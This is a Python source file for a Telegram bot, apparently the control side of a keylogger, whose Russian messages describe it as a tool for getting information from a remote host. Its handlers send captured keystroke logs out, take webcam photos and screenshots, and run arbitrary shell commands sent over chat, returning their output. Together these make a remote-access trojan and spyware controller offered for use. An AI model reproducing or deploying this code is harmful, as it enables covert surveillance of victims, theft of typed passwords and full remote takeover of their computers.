from aiogram import Router, html
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import Message, FSInputFile
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.enums import ParseMode

import subprocess
from keylogger import get_img, get_screen

router = Router()


class Bash_session(StatesGroup):
    command = State()


@router.message(CommandStart())
async def start(message: Message):
    await message.answer("Бот кейлогер для получения информации с удоленного хоста.\n🔒 Список команд: /help")


@router.message(Command("get_logs"))
async def logs(message: Message):
    with open("content/logfile.txt", 'r') as f:
        content = f.read()
    if len(content) == 0:
        await message.answer("Логов нет")
    else: await message.answer(str(content))


@router.message(Command("help"))
async def logs_clear(message: Message):
    await message.answer(
        "Список команд:\nПолучить логи 📚: /get_logs\n"
        "Почистить логи 🗑️: /clear_logs\n"
        "Сделать фото с вебки 📷: /get_img\n"
        "Сделать скриншот 📺: /get_screen\n"
        "Выполнить bash команду 💻: /bash\n"
    )


@router.message(Command("clear_logs"))
async def logs_clear(message: Message):
    with open("content/logfile.txt", 'w') as f:
        pass
    await message.answer("Логи очищенны !")


@router.message(Command("get_img"))
async def send_image(message: Message):
    get_img()
    await message.answer_photo(
        FSInputFile(path="content/photo.png")
    )

@router.message(Command("get_screen"))
async def send_image(message: Message):
    get_screen()
    await message.answer_photo(
        FSInputFile(path="content/screen.png")
    )

@router.message(Command("bash"))
async def start(message: Message, state: FSMContext):
    await message.answer('Отправь мне команду:')
    await state.set_state(Bash_session.command)


@router.message(Bash_session.command)
async def register2(message: Message, state: FSMContext):
    command = message.text
    if command:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 4096:
            output = output[:4096] + '\n... (output truncated)'
        await message.reply(f'Результат выполнения команды:\n <code>{html.quote(output)}</code>',
                            parse_mode=ParseMode.HTML
                            )
        await state.clear()
    else:
        await message.reply('Пожалуйста, укажите команду для выполнения.')
        await state.clear()


@router.message()
async def echo(messange: Message):
    await messange.answer('Я вас не понимаю. Используйте встроенные команды')